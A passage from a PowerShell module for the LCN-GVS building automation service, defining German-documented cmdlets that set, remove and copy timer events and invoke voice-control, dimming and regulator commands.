        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Fuegen Sie ein neuen Zeitschaltpunkt hinzu oder aendern Sie ein vorhandenen.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein neuen Zeitschaltpunkt hinzufuegen oder ein vorhandenen Zeitschaltpunkt aendern.
    .EXAMPLE
        Set-LCNGVSTimerEvent -TimerEvent $TimerEvent
    .EXAMPLE
        Add-LCNGVSTimerEvent -TimerEvent (New-LCNGVSTimerEvent -Description "Es wird Zeit!")
    .COMPONENT
        Timer (Zeitschaltuhr)
    .ROLE
        TimerManagementRight (Zeitschaltuhr)
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Set-LCNGVSTimerEvent # Alias: Add-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias('Add-LCNGVSTimerEvent')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Timer.TimerEvent] $TimerEvent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $Id,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Id')]
        [string] $Description,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Id')]
        [LCNGVS.Timer.Time[]] $Times,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=3,
                   ParameterSetName='Id')]
        [LCNGVS.Timer.SubAction[]] $Actions,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=4,
                   ParameterSetName='Id')]
        [bool] $Enabled
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Set a timer event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    if ($pscmdlet.ParameterSetName -eq 'Id')
                    {
                        $TimerEvent = Get-LCNGVSTimerEvent -Id $Id

                        if ($PSBoundParameters.ContainsKey("Actions")) {$TimerEvent.Action = $Actions}
                        if ($PSBoundParameters.ContainsKey("Description")) {$TimerEvent.Description = $Description}
                        if ($PSBoundParameters.ContainsKey("Enabled")) {$TimerEvent.enabled = $Enabled}
                        if ($PSBoundParameters.ContainsKey("Times")) {$TimerEvent.Times = $Times}
                    }

                    $Script:Timer1Svc.AddOrReplaceTimer($TimerEvent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
        else
        {
            Write-Verbose -Message $($PSBoundParameters | Out-String)
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Loeschen Sie ein vorhandenen Zeitschaltpunkt.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein vorhandenen Zeitschaltpunkt loeschen.
    .EXAMPLE
        Remove-LCNGVSTimerEvent -Id 301c2bc9-5cee-4f73-9d88-9779719d7040
    .COMPONENT
        Timer (Zeitschaltuhr)
    .ROLE
        TimerManagementRight (Zeitschaltuhr)
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Remove-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Remove-LCNGVSTimerEvent',
                  ConfirmImpact='High')]
    [Alias()]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [string] $Id
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "remove timer event"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:Timer1Svc.DeleteTimer($Id)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Kopieren Sie ein vorhandenen Zeitschaltpunkt.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein vorhandenen Zeitschaltpunkt kopieren.

        Hinweis: Die Kopie wird direkt als neuen Zeitschaltpunkt registriert.

    .EXAMPLE
        Copy-LCNGVSTimerEvent -Id 301c2bc9-5cee-4f73-9d88-9779719d7040
    .COMPONENT
        Timer (Zeitschaltuhr)
    .ROLE
        TimerManagementRight (Zeitschaltuhr)
    .LINK
        New-LCNGVSTimerEvent
        Get-LCNGVSTimerEvent
        Set-LCNGVSTimerEvent
        Add-LCNGVSTimerEvent
        Remove-LCNGVSTimerEvent
        Copy-LCNGVSTimerEvent
#>
function Copy-LCNGVSTimerEvent
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Copy-LCNGVSTimerEvent',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Timer.TimerEvent])]
    param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Get timer events"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TimerEvent = $Script:Timer1Svc.GetTimerEvents() | Where-Object -Property id -like -Value $Id
                    $TimerEvent.ID = [GUID]::NewGuid()
                    $Result = Set-LCNGVSTimerEvent -Event $TimerEvent
                    if ($Result -eq $true)
                    {
                        Get-LCNGVSTimerEvent -Id $TimerEvent.ID
                    }
                    else
                    {
                        Write-Error -Message "Internal Error."
                    }
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# -----------------------------------------------
# SubAction - Aktion, ...
# -----------------------------------------------

function New-LCNGVSTimerSubAction
{
    throw "This function is not implemented."
}

# -----------------------------------------------
# Time - Zeit, Ausloesezeitpunkt
# -----------------------------------------------

function New-LCNGVSTimerTime
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/New-LCNGVSTimerTime',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Timer.Time])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Description,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [LCNGVS.Timer.AllRule] $AllRule,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $TimeString = ((Get-Date).AddSeconds(3)).ToLongTimeString()
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }

    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Timer", "Create a Time-object."))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    # Erstellt ein neues Objekt
                    [LCNGVS.Timer.Time] $Time = [LCNGVS.Timer.Time]::new()

                    # Eigenschaft: Beschreibung
                    $Time.Description = $Description # Uebergabe des Parameters

                    # Eigenschaft: Regel
                    if ($PSBoundParameters.ContainsKey("AllRule"))
                    {
                        $Time.Rule = $AllRule # Uebergabe des Parameters
                    }
                    else
                    {
                        # Erstellt ein neues Objekt
                        [LCNGVS.Timer.AllRule] $AllRule = [LCNGVS.Timer.AllRule]::new()
                        $AllRule.allow = $true # Legt fest, dass die Regel aktiv ist.

                        # Eigenschaft: Regel
                        $Time.Rule = $AllRule
                    }

                    # Eigenschaft: Zeit (LongTimeString)
                    $Time.time = $TimeString # Uebergabe des Parameters
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    # Ausgabe des Objektes
                    $Time
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }

    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# -----------------------------------------------
# Rule - Regel, Bedingung ...
# -----------------------------------------------

function New-LCNGVSTimerRule
{
    throw "This function is not implemented."
}


#endregion

# -----------------------------------------------
# Webservice: AppSiri1 - Sprachsteuerung
# -----------------------------------------------
#region Komponente: Sprachsteuerung

<#
    .SYNOPSIS
        Ruft das SiriItemWebService-Dictionary ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Sprachbefehle aus dem Dictionary der Sprachsteuerung abrufen.
    .PARAMETER itemTitle
        Gibt den Schluesselbefehl an.
    .EXAMPLE
        Get-LCNGVSAppSiriItem
    .EXAMPLE
        Get-LCNGVSAppSiriItem -all
    .EXAMPLE
        Get-LCNGVSAppSiriItem -itemTitle Wohnz*
    .EXAMPLE
        Get-LCNGVSAppSiriItem -itemTitle Wohnzimmer
    .LINK
        Get-LCNGVSAppSiriItemAsync
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriCommandAsync
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Get-LCNGVSAppSiriItem # Alias: Load-dic
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSAppSiriItem',
                  ConfirmImpact='Medium')]
    [Alias('Load-Dic')]
    [OutputType([LCNGVS.AppSiri.SiriItemWebService[]])]
    Param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='itemTitle')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", $Script:LocalizedData.GetLCNGVSAppSiriItem))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $items = $Script:AppSiriSvc.Loaddic()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "itemTitle")
                    {
                        $items.Items | Where-Object -Property Title -Like -Value $itemTitle
                    }
                    else
                    {
                        $items.Items
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft das SiriItemWebService-Dictionary ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Sprachbefehle aus dem Dictionary der Sprachsteuerung abrufen.
    .EXAMPLE
        Get-LCNGVSAppSiriItemAsync
    .LINK
        Get-LCNGVSAppSiriItem
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriCommandAsync
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Get-LCNGVSAppSiriItemAsync # Alias: Load-dicAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSAppSiriItemAsync',
                  ConfirmImpact='Medium')]
    [Alias('Load-dicAsync')]
    [OutputType()]
    Param(
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", $Script:LocalizedData.GetLCNGVSAppSiriItem))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.LoaddicAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Fuehrt den Sprachbefehl aus.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den angegebenen Sprachbefehle ausfuehren.
    .PARAMETER itemTitle
        Gibt den Schluesselbefehl an.
    .PARAMETER listSpeechIntent
        Gibt den sekundaeren Sprachbefehl an.
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommand -itemTitle Wohnzimmer -listSpeechIntent Licht
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommand -itemTitle Garage -listSpeechIntent Auf
    .LINK
        Get-LCNGVSAppSiriItem
        Get-LCNGVSAppSiriItemAsync
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriCommandAsync
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Invoke-LCNGVSAppSiriCommand # Alias: Execute-Command
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriItem',
                  ConfirmImpact='Medium')]
    [Alias('Execute-Command')]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", ($Script:LocalizedData.InvokeLCNGVSAppSiriCommand -f $itemTitle, $listSpeechIntent)))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.CommandExecute($itemTitle, $listSpeechIntent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Fuehrt den Sprachbefehl aus.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den angegebenen Sprachbefehle ausfuehren.
    .PARAMETER itemTitle
        Gibt den Schluesselbefehl an.
    .PARAMETER listSpeechIntent
        Gibt den sekundaeren Sprachbefehl an.
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommandAsync -itemTitle Wohnzimmer -listSpeechIntent Licht
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommandAsync -itemTitle Garage -listSpeechIntent Auf
    .LINK
        Get-LCNGVSAppSiriItem
        Get-LCNGVSAppSiriItemAsync
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Invoke-LCNGVSAppSiriCommandAsync # Alias: Execute-CommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias('Execute-CommandAsync')]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", ($Script:LocalizedData.InvokeLCNGVSAppSiriCommand -f $itemTitle, $listSpeechIntent)))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.CommandExecuteAsync($itemTitle, $listSpeechIntent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriDimmingCommand
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriDimmingCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateRange(0,255)]
        [int] $value
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.dimmingCommand($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriDimmingCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriDimmingCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateRange(0,255)]
        [int] $value
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:AppSiriSvc.dimmingCommandAsync($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Invoke-LCNGVSAppSiriAbsRegulatorCommand
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriAbsRegulatorCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
